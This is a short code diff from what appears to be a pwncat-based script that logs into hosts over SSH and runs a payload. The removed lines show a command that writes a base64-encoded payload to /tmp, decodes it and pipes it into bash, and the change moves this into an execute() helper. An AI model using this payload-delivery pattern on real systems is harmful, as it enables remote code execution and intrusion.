@@ -160,6 +160,7 @@ with pwncat.manager.Manager() as manager:
                     user=user,
                     password=password,
                 )
+                execute(session)
             except ChannelError as e:
                 if e.args[0] == 'ssh authentication failed: Authentication failed.':
                     print("Authentication failed: Bad password or user name.")
@@ -175,10 +176,7 @@ with pwncat.manager.Manager() as manager:
                     user=user,
                     identity=identity,
                 )
-                result = session.platform.run(
-                    f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_connector | base64 -d | /bin/bash'",
-                    cwd="/tmp", timeout=900)
-                print(result)
+                execute(session)
             except ChannelError as e:
                 if e.args[0] == 'ssh authentication failed: Authentication failed.':
                     print("Authentication failed: Bad password or user name.")
